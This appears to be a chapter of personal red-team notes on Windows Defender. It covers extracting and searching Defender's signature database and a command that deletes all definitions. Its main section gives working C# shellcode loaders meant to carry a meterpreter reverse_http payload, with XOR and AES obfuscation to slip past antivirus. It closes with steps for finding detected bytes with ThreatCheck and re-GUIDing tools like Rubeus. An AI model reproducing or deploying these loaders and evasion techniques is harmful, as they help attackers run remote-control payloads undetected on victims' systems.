\chapter{Defender}
\label{misc:defender}

%\input{misc/defender/}


\section{Signature Database}

\verb+Get-MpThreatCatalog+ Get Access to Threat database.

\subsection{Decompressing database}
The following script developed by Matt Graeber decompresses Windows Defender Antivirus signatures.
\verb+C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{GUID}\mpavbase.vdm+

\begin{verbatim}
filter Expand-DefenderAVSignatureDB {
<#
.SYNOPSIS

Decompresses a Windows Defender AV signature database (.VDM file).

.DESCRIPTION

Expand-DefenderAVSignatureDB extracts a Windows Defender AV signature database (.VDM file). This function was developed by reversing mpengine.dll and with the help of Tavis Ormandy and his LoadLibrary project (https://github.com/taviso/loadlibrary). Note: Currently, "scrambled" databases are not supported although, I have yet to encounter a scrambled database. Thus far, all databases I've encountered are zlib-compressed.

.PARAMETER FilePath

Specifies the path to a Defender AV signature file. Defender AV signature databases are stored in "%ProgramData%\Microsoft\Windows Defender\Definition Updates\{GUID}\*.vdm". The file path must have the .vdm extension.

.PARAMETER OutputFileName

Specifies the filename of the extracted signature database. This is written to the current working directory.

.EXAMPLE

ls 'C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{42F61A44-8142-4AF4-8E13-6EA18B60C397}\mpavbase.vdm' | Expand-DefenderAVSignatureDB -OutputFileName mpavbase.decompressed

Extracts the signature database from mpavbase.vdm and writes it to mpavbase.decompressed in the current directory.

.OUTPUTS

System.IO.FileInfo

Outputs a FileInfo object indicating successful extraction of the .VDM file.
#>

    [OutputType([System.IO.FileInfo])]
    param (
        [Parameter(Mandatory, ValueFromPipelineByPropertyName)]
        [String]
        [Alias('FullName')]
        [ValidateScript({$_.EndsWith('.vdm')})]
        $FilePath,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $OutputFileName
    )

    if (-not (Test-Path -Path $FilePath)) {
        Write-Error "$FilePath does not exist"
        return
    }

    $FileFullPath = Resolve-Path -Path $FilePath

    $FileBytes = [IO.File]::ReadAllBytes($FileFullPath.Path)

    if ([Text.Encoding]::ASCII.GetString($FileBytes[0..1]) -ne 'MZ') {
        Write-Error "$FileFullPath is not a valid PE file."
        return
    }

    # Note: Codepage 28591 returns a 1-to-1 char to byte mapping
    $Encoding = [Text.Encoding]::GetEncoding(28591)

    $FileString = $Encoding.GetString($FileBytes)

    # Most of this logic is present in mpengine!load_database and subsequent function calls

    $DatabaseSigRegex = [Regex] 'RMDX'

    $Result = $DatabaseSigRegex.Match($FileString)

    if (-not $Result.Success) {
        Write-Error 'Defender AV signature database header signature ("RMDX") was not found'
        return
    }

    $HeaderIndex = $Result.Index
    $HeaderSize = 0x40

    [Byte[]] $HeaderBytes = $FileBytes[$HeaderIndex..($HeaderIndex + $HeaderSize - 1)]
\end{verbatim}
\begin{verbatim}
    $Options = [BitConverter]::ToInt32($HeaderBytes, 0x0C)
    $MaybeChecksum = [BitConverter]::ToInt32($HeaderBytes, 0x1C)
    $LastFieldUnknown = [BitConverter]::ToInt32($HeaderBytes, 0x3C)

    $IsCompressed = [Bool][Byte](($Options -shr 1) -band 0xFF)

    if (-not $IsCompressed) {
        Write-Warning 'Signature database is "scrambled". Figure out how to programmatically recover this. Unable to continue.'
        return
    }

    # Offset to the compressed data info from the start of the sig db header
    $CompressedDataInfoOffset = [BitConverter]::ToInt32($HeaderBytes, 0x18)

    if ((($Options -band 0x200000) -eq 0) -or ($MaybeChecksum -eq 0) -or ($LastFieldUnknown -eq 0)) {
        Write-Error "Invalid Defender AV signature database header."
        return
    }

    $CompressedDataLength = [BitConverter]::ToInt32($FileBytes, $HeaderIndex + $CompressedDataInfoOffset)
    $CompressedDataChecksumMaybe = [BitConverter]::ToInt32($FileBytes, $HeaderIndex + $CompressedDataInfoOffset + 4)
    $CompressedDataIndex = $HeaderIndex + $CompressedDataInfoOffset + 8

    # To-do: this is slow. I need to figure out how to speed up array splicing
    $CompressedData = $FileBytes[$CompressedDataIndex..($CompressedDataIndex + $CompressedDataLength - 1)]

    $MemoryStream = New-Object -TypeName IO.MemoryStream -ArgumentList @(,$CompressedData)

    # Write the decompressed signature database contents to the filename specified in the current directory.
    $DecompressedFileStream = [IO.File]::Create("$PWD\$OutputFileName")

    $DeflateStream = New-Object IO.Compression.DeflateStream -ArgumentList ($MemoryStream, [IO.Compression.CompressionMode]::Decompress)

    try {
        $DeflateStream.CopyTo($DecompressedFileStream)
    } catch {
        Write-Error $_
    } finally {
        $DeflateStream.Close()
        $DecompressedFileStream.Close()
        $MemoryStream.Close()
    }

    Get-Item -Path "$PWD\$OutputFileName"
}

\end{verbatim}

\subsection{Searching database}

\begin{verbatim}
Import-Module C:\Tools\ExpandDefenderSig\ExpandDefenderSig.ps1
ls "C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{50326593-AC5A-4EB5-A3F0-047A75D1470C}\mpavbase.vdm" | Expand-DefenderAVSignatureDB -OutputFileName mpavbase.raw
C:\Tools\Strings\strings64.exe .\mpavbase.raw | Select-String -Pattern "WNcry@2ol7"
\end{verbatim}

in theory it is possible to delete signature file or
\begin{verbatim}
C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe -RemoveDefinitions -All
\end{verbatim}

\section{Bypass static analysis}

\subsection{Shell Code loader}

\subsubsection{Simple}
\begin{verbatim}
using System;
using System.Linq;
using System.Runtime.InteropServices;

namespace NotMalware
{
    internal class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(
                                                IntPtr lpStartAddr, 
                                                UInt32 size,
                                                UInt32 flAllocationType, 
                                                UInt32 flProtect
                                            );

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(
                                                IntPtr lpAddress, 
                                                uint dwSize, 
                                                UInt32 flNewProtect, 
                                                out UInt32 lpflOldProtect
                                            );

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
                                                UInt32 lpThreadAttributes, 
                                                UInt32 dwStackSize, 
                                                IntPtr lpStartAddress, 
                                                IntPtr param, 
                                                UInt32 dwCreationFlags, 
                                                ref UInt32 lpThreadId
                                            );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
                                                    IntPtr hHandle, 
                                                    UInt32 dwMilliseconds
                                                );

        static void Main(string[] args)
        {
            // Shellcode 
            // (msfvenom -p windows/x64/meterpreter/reverse_http LHOST=... LPORT=... -f csharp)
            byte[] buf = new byte[] {<SNIP>};

            // Allocate RW space for shellcode
            IntPtr lpStartAddress = VirtualAlloc(
                                                IntPtr.Zero, 
                                                (UInt32)buf.Length, 
                                                0x1000, 
                                                0x04
                                            );

            // Copy shellcode into allocated space
            Marshal.Copy(buf, 0, lpStartAddress, buf.Length);

            // Make shellcode in memory executable
            UInt32 lpflOldProtect;
            VirtualProtect(
                            lpStartAddress, 
                            (UInt32)buf.Length, 
                            0x20, 
                            out lpflOldProtect
                        );

            // Execute the shellcode in a new thread
            UInt32 lpThreadId = 0;
            IntPtr hThread = CreateThread(
                                        0, 
                                        0, 
                                        lpStartAddress, 
                                        IntPtr.Zero, 
                                        0, 
                                        ref lpThreadId
                                    );

            // Wait until the shellcode is done executing
            WaitForSingleObject(hThread, 0xffffffff);
        }
    }
}

\end{verbatim}



\subsubsection{XOR obfuscation}

shell code loader with \verb+xor obfuscation+ (key \verb+0x5C+)

use \href{https://gchq.github.io/CyberChef/#recipe=From_Hex('0x%20with%20comma')XOR(%7B'option':'Hex','string':'5c'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)}{cyberchef} to transform the shellcode


\begin{verbatim}
// Allocate RW space for shellcode
<SNIP>

// Decrypt shellcode
int i = 0;
while (i < buf.Length)
{
    buf[i] = (byte)(buf[i] ^ 0x5c);
    i++;
}

// Copy shellcode into allocated space
\end{verbatim}

\subsubsection{AES Encryption}

use \href{https://gchq.github.io/CyberChef/#recipe=From_Hex('0x%20with%20comma')AES_Encrypt(%7B'option':'Hex','string':'1f768bd57cbf021b251deb0791d8c197'%7D,%7B'option':'Hex','string':'ee7d63936ac1f286d8e4c5ca82dfa5e2'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)To_Base64('A-Za-z0-9%2B/%3D')}{cyberchef}

\begin{verbatim}
// Decrypt shellcode
            Aes aes = Aes.Create();
            byte[] key = new byte[16] { 0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97 };
            byte[] iv = new byte[16] { 0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2 };
            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
            byte[] buf;
            using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc)))
            {
                using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (var msPlain = new System.IO.MemoryStream())
                    {
                        csDecrypt.CopyTo(msPlain);
                        buf = msPlain.ToArray();
                    }
                }
            }

            // Allocate RW space for shellcode
\end{verbatim}




\section{Tools}

\subsection{ThreatCheck}
\href{https://github.com/rasta-mouse/ThreatCheck}{ThreatCheck}, \href{https://github.com/PACHAKUTlQ/ThreatCheck}{PACHAKUTlQ/ThreatCheck} allow to locate which bytes trigger a detection

Need defender on, but \verb+Real-time protection+ and \verb+Automatic sample submission+ are disabled and an exlusion is set for the folder related to devlopment

Using the \href{https://learn.microsoft.com/en-us/visualstudio/ide/reference/command-prompt-powershell?view=vs-2022}{x64 Native Tools Command Prompt}, we can use \href{https://learn.microsoft.com/fr-fr/visualstudio/msbuild/walkthrough-using-msbuild?view=vs-2022}{msbuild} to compile the project as it is:
\begin{verbatim}
msbuild SharpWMI.sln /p:Configuration=Release /p:Platform="Any CPU" -restore -noLogo
\end{verbatim}

          

The next step is to disable Windows Defender, copy the executable outside the exclusion (usually a good idea to rename the executable), and run ThreatCheck against it to determine which parts of the program are detected as malicious.
\begin{verbatim}
copy SharpWMI.exe \Temp\s.exe
C:\Users\Public\tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\x64\Release\ThreatCheck.exe -f c:\temp\s.exe
\end{verbatim}

\begin{verbatim}
visual studio installer => Modify on visual studio version => select workload to install:

.Net desktop devlopemnt
Universl Windows Platform development
Desktop developelent with c++
\end{verbatim}





\section{Notes}

\verb+"C:\Users\jubeaz\Desktop\repositories\Rubeus\Rubeus\Properties\AssemblyInfo.cs"+ 
\begin{verbatim}
// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid("658c8b7f-3664-4a95-9572-a3e5871dfc06")]
\end{verbatim}

generate a new GUID in powershell:
\begin{verbatim}
[GUID]::NewGUID()
\end{verbatim}



\section{links}

\url{https://gist.github.com/imaibou/92feba3455bf173f123fbe50bbe80781}

\url{https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/}

\url{https://blog.ndepend.com/in-the-jungle-of-net-obfuscator-tools/}






